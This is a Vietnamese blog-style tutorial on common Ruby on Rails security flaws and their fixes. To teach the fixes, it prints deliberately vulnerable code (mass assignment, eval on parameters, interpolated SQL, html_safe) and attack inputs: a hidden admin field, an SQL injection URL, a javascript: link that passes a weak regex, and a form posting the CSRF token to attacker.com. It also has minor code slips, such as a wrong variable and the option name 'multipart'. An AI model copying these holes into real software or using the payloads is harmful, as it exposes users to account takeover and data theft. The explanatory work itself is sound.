![](https://images.viblo.asia/97bf0a6f-2c91-4479-9e41-cbf3b1211a03.jpg)
Ruby on Rails làm tất cả để giữ cho bạn được bảo mật. Tuy nhiên, ngay trong tài liệu chính thức cũng đề cập tới, không có nền tảng nào mà có thể bảo mật hoàn toàn. Do đó, các bạn cần phải hiểu rõ các lỗi bảo mật phổ biến mà dễ gặp phải.
Các lỗi bảo mật hay gặp gồm có:

* Mass assignment
* Tấn công XSS
* SQL injections
* Executing arbitrary code
* Form hijacking
* Ghi lại dữ liệu cá nhân
* Tiết lộ các private token
* Nhúng trang web trong iFrame
* Tải lên các file thực thi
### **Mass Assignment**

Đây là một trong những lỗi bảo mật phổ biến nhất. Mass assignment gán biến tùy tiên, nghĩa là hacker cố gắng cập nhật nhiều trường trong database cùng lúc, bao gồm những trường không được phép sửa với quyền user bình thường.

Ví dụ: ta có form sửa thông tin user:
```ruby
<%= form_for @user do |f| %>
  <%= f.label :name %>
  <%= f.text_field :name %>
 
  <%= f.label :surname %>
  <%= f.text_field :surname %>
 
  <%= f.submit %>
<% end %>
```
Và trong controller:
```ruby
def update
  @user = User.find(params[:id])
  if @user.update_attributes(params[:user])
    redirect_to some_path
  else
    render :edit
  end
end
```
Nhìn qua rất hợp lý, nhưng thực sự đó là một lỗ hổng bảo mật lớn. Nếu bảng user có cột admin, một kẻ xâm nhập có thể dễ dàng chỉnh sửa. Chỉ cần thêm một trường ẩn trong form:
```ruby
<input type="hidden" name="user[admin]" value="true">
```
Vâng, bạn có thể đoán điều gì sẽ xảy ra, hacker giờ có quyền một admin, bởi vì chúng ta cho phép điều đó xảy ra. Thật tệ, điều đó giải thích tại sao các tham số chắc chắn (strong parameters) được giới thiệu ngay từ đầu của Rails core version 4. Với strong parameters, bạn cung cấp một danh sách các thuộc tính được cho phép thay đổi bởi user.
```ruby
def update
  @user = User.find(params[:id])
  if @user.update_attributes(user_params)
    redirect_to some_path
  else
    render :edit
  end
end
 
private
 
def user_params
  params.require(:user).permit(:name, :surname)
end
```
Giờ đây, chỉ name và surname là được thay đổi, các tham số khác sẽ bị bỏ qua.
Nếu bạn muốn chấp nhận tất cả các tham số với key được cung cấp, sử dụng hàm `permit!`
```ruby
params.require(:user).permit!
```
Tuy nhiên, hãy xem xét kỹ khi thực hiện.

### **XSS Attacks**
Cha của Conan đã từng nói: “Không một ai trên thế này mà bạn có thể tin tưởng: đàn ông, đàn bà, quái vật, …”? ĐIều đó cũng đúng trên web. Đừng bao giờ tin tưởng dữ liệu được gửi từ user ngoại trừ app của bạn chỉ được sử dụng bởi một nhóm nhỏ hoặc chỉ với vài tính năng đơn giản. Thực sự, trong các trường hợp đó, cũng đừng tin tưởng user bởi vì họ có thể làm một vài thứ rất đơn giản nhưng đầy nguy hiểm.

Khi muốn output ra view, nên sử dụng hàm `html_safe`, tuy nhiên cũng cần phải cẩn thân:
```ruby
# your controller
@blog_post = current_user.blog_posts.find_by(id: params[:id])
 
# your view
<%= @blog_post.body.html_safe %>
```
Nếu ai khác được giao nhiệm vụ viết bài báo cho blog, có một kẻ xâm nhập có thể cố gắng chèn một vài dòng Javascript vào nội dung của bài báo, chúng cũng tương tự như các đoạn script khác. Một hachker có thể hiển thị một vài thông báo trên trang của bạn, hay chuyển hướng user đến các trang khác bằng cách thêm `window.location.href attribute`. Thậm chí, hacker có thể nhúng một key logger, ghi lại các phím bạn ấn trên trong web của bạn để trôm mật khẩu hay các thông tin khác, điều đó thật tệ.

Do đó, nếu bạn muốn hiển thị nội dung của user trên một trang, đừng bao giờ sử dụng `html_safe` trực tiếp. Đầu tiên, sử dụng hàm `sanitize` và chỉ rõ danh sách các tag được hiển thị: luôn luôn sử dụng theo format, b hay i:

`<%= sanitize(@blog_post.body, tags: %w(b strong em i)).html_safe %>`
Gem Sanitize sẽ cung cấp các công cụ hữu dụng nếu bạn có vấn đề gặp phải.
### **Executing Arbitrary Code**
Phải cẩn thận khi bạn chạy các đoạn mã được sinh ra dựa vào các thông tin được gửi bởi user, nếu không bạn sẽ gặp phải một lỗ hổng nghiêm trong. Đặc biệt khi sử dụng các hàm từ module` ActiveSupport::Inflector` hay hàm giống như` eva`l, có thể để lộ hệ thống của bạn cho kẻ tấn công. Ví dụ, điều này không bảo mật và nên được tránh mọi lúc:
```ruby
eval(params[:id])
```
Nếu bạn thực sự cần phải chạy code dựa theo thông tin user gửi lên, hãy kiểm tra dữ liệu đầu vào và lên danh sách các giá trị được phép.
### **SQL Injection**
SQL injections thường được dùng để truy cập vào các dữ liệu nhạy cảm mà user không có quyền thay đổi. Trong hầu hết các trường hợp, Rails dev luôn được bảo vệ khỏi SQL injections, ví dụ với xử lý:
```ruby
@user = User.find_by(id: params[:id])
```
đã được kiểm tra rồi (tương tự như strong parameters). Tuy nhiên, với cách xử lý sau:
```ruby
@user = User.where("id = '#{params[:id]}'")
```
là không được kiểm tra trước, do đó đừng bao giờ làm theo. Một hacker có thể sửa lại đường link` http://yoursite.com/user?id='` OR 1 và toàn bộ user trên trang web sẽ hiển thị ra.


Để ngăn ngừa cách tấn công này, hãy sử dụng kết hợp chuỗi với sự giúp đỡ của kí tự `?` cho các câu truy vấn phức tạp.
```ruby
@user = User.where("id = ?", params[:id])
```
Trong trường hợp này, đầu vào sẽ được kiểm tra. Hiện giờ , với việc bổ sung Arel vào trong Rails core, các câu truy vấn sẽ trở nên đơn giản hơn. Ví dụ thay vì viết:
```ruby
@user = User.where("id = ? OR name = ?", params[:id], params[:name])
```
thì có thể viết thành:
```ruby
@user = User.where(id: params[:id]).or(where(name: params[:name]))
```
### **Form Hijacking**

Rails đã bổ sung token CSRF cho mỗi form. Điều đó sẽ ngăn chặn phương thức tấn công của hacker là chèn form của chính hacker vào trang web để sử dụng như một form hợp pháp.
```ruby
<form method="post" action="//attacker.com/tokens">
  <form method="post" action="/legit_action">
  <input type="hidden" name="authenticity_token" value="thetoken">
</form>
```
HTML không cho phép các form lồng nhau, do đó form chưa mã độc sẽ thay thế form ban đầu, trong khi vẫn giữ lại token. Nếu form được gửi đi, token sẽ được gửi đến trang web giả mạo. Mặc dù cách tấn công này khá hiếm và khó xảy ra, nhưng chúng ta vẫn nên biết.


Trong rails 5, đã mặc định gắn `Rails.application.config.action_controller.per_form_csrf_tokens` là true. Cấu hình này luôn được đặt trong `config/initializers/new_framework_defaults.rb`

### **Revealing Private Tokens**

Ứng dụng của bạn sử dụng một danh sách các token cá nhân để tương tác với bên thứ 3 hay cho phép xác thực OAuth2 chẳng hạn. Hãy luôn cẩn thận với các token này và đừng bao giờ để lộ chúng ra ngoài (trong một repo public của GitHub). Cách đơn giản nhất là tách chúng ra thành các biến môi trường và sử dụng gem như dotenv-rails. Với dotenv-rails, bạn tạo một file là .env và loại bỏ file đó khỏi bộ điều khiển version (git).
```ruby
# .gitignore
.env
```

và đặt các token vào file:

Trên production, các biến này luôn được đặt trong file cấu hình server.
Trong các phiên bản cũ của Rails, một token bí mật được nằm trong` config/initializers/secret_token.rb,` nhưng cũng không đảm bảo an toàn cho mọi case. Rails 4 đã giới thiệu một file đặc biệt `config/secrets.yml `với các token production được cấu hình để sử dụng một biến ENV.
```ruby
production:
  secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
```
Nhân tiện đây, đừng quên đặt `secret_key_base` vào trong biến môi trường, và đừng đặt key với giá trị đơn giản – chạy lênh` rake secret` và sử dụng giá trị được sinh ra.

### **Logging Private Data**

Rails app log lại tất cả các tương tác của bạn và đó là một điều tất. Tuy nhiên, một vài thông tin cá nhân cũng có thể bị ghi lại, và trở thành món ngon cho ai đó có thể truy cập vào server. Ví dụ dữ liệu chứa mật khẩu user, số thẻ tin dụng, ..

Trong Rails có setting `Rails.application.config.filter_parameters` được định nghĩa trong file c`onfig/initializers/filter_parameter_logging.rb`. Ban đầu, nó trông như:
```ruby
Rails.application.config.filter_parameters += [:password]
```

Tuy nhiên, hãy đảm bảo cập nhật file này nếu ứng dụng của bạn làm việc với các dữ liệu nhạy cảm.

### Sending Sensitive Data via HTTP

Dữ liệu nhạy cảm không bao giờ được truyền thông qua giao thức HTTP. Ví dụ, bạn cài đặt một giao thức HTTP chứng thực đơn giản:
```ruby
class SomeController < ApplicationController
  before_action :authenticate!
  private
  def authenticate!
    authenticate_or_request_with_http_basic do |id, password|
        name == 'admin' && password == '12345'
    end
  end
end
```
Username và password có thể dễ dàng bị đánh cắp bởi hacker nếu sử dụng một công cụ gọi là `Wireshark` nếu kết nối không được mã hóa. Do đó, bạn phải đảm bảo SSL cho controller:
```ruby
class SomeController < ApplicationController
  force_ssl
  before_action :authenticate!
  #...
end
```
SSL có thể được gắn cho toàn bộ ứng dụng thông qua cài đặt:
```ruby
# config/application.rb.
config.force_ssl = true
```
### **Uploading Executable Files**

Rất nhiều ứng dụng cho phép user tải lên các file, ví dụ hình ảnh hay file văn bản. Khi đó, cần phải kiểm tra kỹ kích thước file và cực kỳ cẩn thận với các file thực thi và scripts.

Một hacker có thể cố gắng tải một file chứa mã độc lên server của bạn và có thể tự động thực thi, điều đó có thể dẫn đến rất nhiều vấn đề nghiêm trọng. Ví dụ khi tải các file được đặt trong folder public, nhưng lại cũng được cài đặt như thư mục Apache root.

Có nhiều giải pháp như Paperclip, Carrierwave, Dragonfly, và các công cụ khác, bạn nên kiểm tra kỹ tài liệu khi thực hiện chức năng upload file để lựa chọn cho đúng.

### **Regular Expressions**

Những lập trình viên mới bắt đầu Ruby, thường sử dụng ký hiệu ^ và $ trong các regular expressions như điểm bắt đầu và kết thúc một chuỗi. Trong thực thế, mặc dù các ký hiệu đó nghĩa là bắt đầu và kết thúc của một dòng, nhưng không phải là toàn bộ một chuỗi. Do đó, nếu dùng regular expression để kiểm tra một URL được nhập bởi user:
```ruby
/^https?:\/\/[^\n]+$/i
```
là không bảo mật, bởi vì hacker có thể dễ dàng cung cấp
```js
javascript:some_bad_code();/*
http://anything.com
*/
```
Đó sẽ là một URL đúng dựa theo quan điểm của regex. Nếu bạn chèn URL này vào view:
```ruby
link_to "User's website", @user.website
```
ai đó nếu ấn vào link này sẽ chạy luôn đoạn mã độc JavaScript. Đề phòng ngừa phương thức tấn công này, sử dụng kí hiệu `\A` và` \z` khi thể hiện bắt đầu và kết thúc của một chuỗi thay vì `^` và `$`
```ruby
/\Ahttps?:\/\/[^\n]+\z/i
```
Những ứng dụng Rails hiện giờ đã ý thức được lỗ hổng này và trong format kiểm tra `validates :some_column`, `format: {...}` sẽ bắn lỗi khi bạn sử dung kí hiệu` ^ `và `$` trong một regular expression. Nếu bạn cần phải sử dụng các kí hiệu đó, mà không dùng `\A` và `\z`, hãy cài đặt option` multipart` là `true` khi tạo bộ kiểm tra.
Ngoài ra, bạn có thể kiểm tra các regular expression thông qua trang web Rubular
### **Embedding Site via IFrame**

Đây là một lỗ hổng ít phổ biến hơn. Mặc định, trang web của bạn được nhúng vào các nguồn khác bằng cách sử dụng `iframe`
```ruby
<iframe src="http://your-resource.com">
```
Dường như không có vấn đề gì cả. Tuy nhiên, giả sử trang web của bạn có một trang thay đổi mật khẩu. Gồm 2 trường (password và password confirmation) khi submit.

Hacker có thể một trang web như `winiphone7.com` và giả danh là hợp pháp. Trong trang này cũng hiển thị 2 trường và một nút ở tương tự vị trí và độ rộng giống như trên trang của bạn. Trang đấy cũng được nhúng vào ứng dụng của bạn thông qua một iframe nhưng làm nó trong suốt với sự trợ giúp của thuộc tính `opacity`. Iframe này được đặt cùng vị trí với textfield và nút submit. Sau đó hacker viết: “Hãy viết cụm từ ‘Tôi muốn iphone 7’, viết lên 2 trường và ấn submit. Bạn sẽ được tham gia cơ hội để giành được iphone. Đừng lo tất cả các kí tự sẽ được giấu đi.”

Và bạn sẽ thấy điều đó sẽ là:

Người dùng nghĩ là họ đang nhập một vài text trong trang winiphone7.com, nhưng thực sự họ đang thay đổi mật khẩu của họ và đặt thành “Tôi muốn iphone 7”

Dĩ nhiên, thực tế kiểu tấn công này không phổ biến và khó thành công, hầu hết người dùng sẽ thấy nghi ngờ.Tuy nhiên, nó sẽ chỉ hoạt động nếu sesion trên trang web của bạn vẫn hoạt động.

Hãy nhớ tình huống này trong đầu và không cho phép nhúng trang web của bạn vào bất cứ nguồn nào bằng cách cài đặt `X-Frame-Options HTTP` header trong file `config/application.rb`
```ruby
config.action_dispatch.default_headers = {
    'X-Frame-Options' => 'SAMEORIGIN'
}
```
Hiện giờ các phiên bản Rails đều đã cài đặt mặc định cấu hình này.

Trên đây là một vài vấn đề bảo mật mà một ứng dụng có thể gặp phải, chúng ta cần phải biết và phòng tránh trước khi đưa ứng dụng lên production. Rails đã cung cấp các giải pháp bảo mật tốt, bạn nên dành chút thời gian tìm hiểu các hướng dẫn bảo mật trong các tài liệu chính thức của Rails để đảm bảo ứng dụng luôn được an toàn.

### **Tài liệu tham khảo:**
1. https://www.netsparker.com/blog/web-security/preventing-xss-ruby-on-rails-web-applications/
2. https://frontdeveloper.pl/2018/10/5-security-issues-in-ruby-on-rails/